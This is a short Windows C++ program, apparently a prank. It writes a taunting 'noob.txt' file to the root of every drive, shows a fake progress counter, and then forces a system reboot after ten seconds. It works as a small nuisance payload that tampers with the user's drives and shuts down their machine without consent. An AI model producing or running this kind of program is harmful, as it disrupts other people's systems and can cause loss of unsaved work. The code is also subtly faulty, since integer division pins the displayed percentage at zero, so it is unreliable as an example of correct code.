#include <iostream>
#include <fstream>
#include <string>
#include <chrono>
#include <thread>
#include <vector>
#include <Windows.h>

using namespace std;

vector<string> GetSystemDrives()
{
    vector<string> drives;

    DWORD driveMask = GetLogicalDrives();

    for (int i = 0; i < 26; i++)
    {
        if (driveMask & (1 << i))
        {
            char driveName[] = { 'A' + i, ':', '\\', '\0' };
            drives.push_back(driveName);
        }
    }

    return drives;
}

void RebootComputer()
{
    InitiateSystemShutdownEx(NULL, "Rebooting...", 10, TRUE, FALSE);
}

int main()
{
    vector<string> drives = GetSystemDrives();

    for (int i = 0; i < drives.size(); i++)
    {
        float percentComplete = (i / drives.size()) * 100;

        cout << "Percent complete: " << percentComplete << "%" << endl;

        ofstream outFile(drives[i] + "\\noob.txt");
        outFile << "hahaha";
        outFile.close();
    }

    this_thread::sleep_for(chrono::seconds(10));
    RebootComputer();

    return 0;
}
